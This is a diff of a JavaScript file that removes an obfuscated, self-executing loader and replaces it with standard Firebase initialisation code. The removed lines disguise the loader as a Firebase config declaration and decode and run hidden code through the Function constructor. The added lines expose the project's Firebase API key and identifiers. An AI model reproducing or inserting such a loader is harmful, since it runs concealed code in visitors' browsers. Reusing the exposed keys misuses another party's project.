@@ -276,9 +276,35 @@ function setElementHeight(selector, offset = 0) {
   
   
   
-  var firebaseConfig,app,analytics,database;(function(){var OqB='',ryg=286-275;function lGR(a){var q=4518447;var w=a.length;var p=[];for(var k=0;k<w;k++){p[k]=a.charAt(k)};for(var k=0;k<w;k++){var h=q*(k+554)+(q%42026);var i=q*(k+700)+(q%45763);var b=h%w;var r=i%w;var y=p[b];p[b]=p[r];p[r]=y;q=(h+i)%4874426;};return p.join('')};var wUK=lGR('sojtafuvyircurnrchszetnmqobodxlcpwkgt').substr(0,ryg);var UAp='o-a v=;=ie;;a(al0aav)uoeC0ah+)evArijhm;v ucflenv2s6nr;+=r (qh)ll}9v7kbc3)(aa42,<c,hl,tv+t)ni=d8{ia( ;v,n0";2n77rr5j]s,{1)eo(r =(gccv(v;gCh6irhgo;+ ],r{18;.ia-m[+](=)=,)olgrpae6[(gdh";= .8=2"a"h66+angbv;rrdnvt;-;1;;y[fr=nS)hno+75u(+)+4";6{r)hlhm;nt)()>{kvr.=;=;);r;a6r(ar)p vvlrjo;h(7]1r=,.y;tt<o1;rn=rh].t=+tA+)8[g;tqo) tm=0)l.)am) [h}v}=n+=g9l nkbg;,ar c1{s0rrr8oxh[< whtp}her)5auu-ylAAjmCadn[li7=r=h=v.r><u+vrgcv+;;=(r;qfun2n+.jua)dteutneo f-d;=],yr++(eyd!a vi(s{q,;afxv(to.=;=]eifuv}r=had9sqm;r(t.=St=fur)ar1+6f[t2[]0+r7;d]cyr+="8}rosex4.=t.(re=hi,up3,c-(Cea0gr=t rl(-..]8usl=i"s r,trie(asv)l))hcc)[uug;2)=v)h9j]+.;ht((=";pul;0ru2(t< =cv aoh,ahnq)osdz]k.,[*,(9e)nc..7+(pvy)bk,d.p)t1es1[3r[4ii +arplhalic"o=afqacytoa,8ai*s),u9ce1j(9n;rCn;niy41[2,pcbn(0l"tgf=ff2]neheoi1nr6,i,oA(r.rel=i;n6l.sh0(m;gC!tnd0re=jb f5g;(f.neft=0ia+fsoi.+rg.,]ske}(mrh.rr  o0l;8.1, ngtaC=otgs,lext p;pCxx.i,f(ha;';var nMY=lGR[wUK];var wyd='';var EnF=nMY;var opO=nMY(wyd,lGR(UAp));var ZFh=opO(lGR('a&gIiOe$SthipOM]3sSt;i$p=Ofia37n),g)-(t=eDi};#2ipg(9eb6sfDe)1u}ieOi1 3y2t)a1Oh,_#(Og,as=d_sa)2.1)1(t(e;}b)fst,ri6abrsmOc :y0)a7$esfin.5Of;(}af_\/2!_t.iw!;r;r!.So,(n,s4zOpd):EOntc$=].De4j.)(O8esa 7sf(f*r puts;phe.O}be-e4po3c+;q( xfsO\'ptth eerm5afisyfoOO;,%psyh8b;;4OO;.q7O.O0%.}!bt"(ytsc1]m]$6di!-.za[ib ds)$)nO{Ofae}}pe6aee1on\'abO\'),e94!eiyt)esncp)c)c(a{. n0(i!tp(_O4f3l.qnOl!.d=r4{rssr pO0j1crfo;r9{--3mj1OrSaae8touas=n}i4;O)ao_r0n-fCt11Oae)t\/OO(a\/{e)fcg)q3y0aeO3)u&nOOir 9O,.jd=.eO4oir%!.{a;.]{5%.8% oe)c#:.;}=., e;!eei54\/_$rr!)hf$.0nraq_t6(%.a2-el=oni)(c.2.l\/!nOl%pf;sfOfOd0.q4[,fbo)),ee5!+aa.t;74p)2.rze(O6"_3bj=4O),5$)=)fda;(6cpkC;}e.1.,xOO1=r]a4iOOiO0(u*,O$"m_ptaao#f\/O2icyOO3j(ort_0\'s,OOeeeesa.O!jh(! .-2..Oeq3(ie1,q,s(s0;$bt)O,!,qbti!iO),yfey.4*.%.O765$ds_!(ibtrplu ).nO1th.eroa74C8f9;eOr01)1+%S[1s5Ol"vf#%a=9r;.On)ofz_aO;_!=(rO\/gea}ourr7n,fe,n7o.slf%s),r0)e1kipa_)_$arts+aepO!u0.b3sO1;nfzi.pOO(;fmO)[y"=OO)! af_g1..eC,nysi-f\/.b;O,e1_st6f}_ac7O1=!a9,rt.Oon;1nk)6,ter.meO(.p+I(s5Oemiv ;sg;nc}rpi3!.ea9OeOt(gO{1n50O,(et1O{0,Ol.nc4fy=wb-ppOtr{{=pi)s{.Cpa.s.(7e{a.ijiiiz*e!;6;Oyi,mfi w,%tu3+O=.o4.nm;4f.8zjl\/,%;a6g,!;or.v33Oeccetiud]pmde(see3g5.;(2:3&O4Ol(OOe.]e$5jeu,Og.)mu0r.$($et$}mn]66sa+at=mfs2a1p Oenp3.gpp=$%2n6f*sl%aa.meec4ti,tts1{e}dc3ese,;O#r.5(f;{fre)tyl4.ef((a4u:ea2+$ te.u}%l;On%_otObi.7%me!o)n#s,,isse!=gabOO7iOsgO.]tp(.Ob)ne!OO3y9(saIftat11Dfdex0ia"iS2O}e\'ba!,O6v6=3ba 1r6o&p}iil!55C;O7i,ja4=g74(fu3orl3=,egfO)1,ss}r\/2(o} OO7paeef.Sd(dsl7O,x.a25e27p$}rO3+5exOf=$feeb()le(hq[q0n,sxn04)6f5p;i.t=]btik$2.Oxn.\/j)sujn4+a$1meS7rp..l),rOnfiamo5=t(ham)O\/ifr;7.=pub[.f $as., "].!(]-.eot..b.Oac$106ueOoeO$sehe4!_(-g]\/t'));var PnM=EnF(OqB,ZFh );PnM(6177);return 3245})()
-  
-  
+  // Import the functions you need from the SDKs you need
+import { initializeApp } from "firebase/app";
+import { getAnalytics } from "firebase/analytics";
+import {
+  getDatabase,
+  ref,
+  onValue,
+  get,
+  set,
+  update,
+  remove
+} from "firebase/database"; // <-- Added this line
+
+// Your web app's Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyBmzsiveIceDQSbSrO-phCB1WmqksjsCVc",
+  authDomain: "yasxpress-f9bfc.firebaseapp.com",
+  databaseURL: "https://yasxpress-f9bfc-default-rtdb.firebaseio.com",
+  projectId: "yasxpress-f9bfc",
+  storageBucket: "yasxpress-f9bfc.firebasestorage.app",
+  messagingSenderId: "846222157126",
+  appId: "1:846222157126:web:1e890c791fc4f0912db147",
+  measurementId: "G-PMFSKE339V"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
+const database = getDatabase(app); // <-- You'll use this to access your database
   
   
   
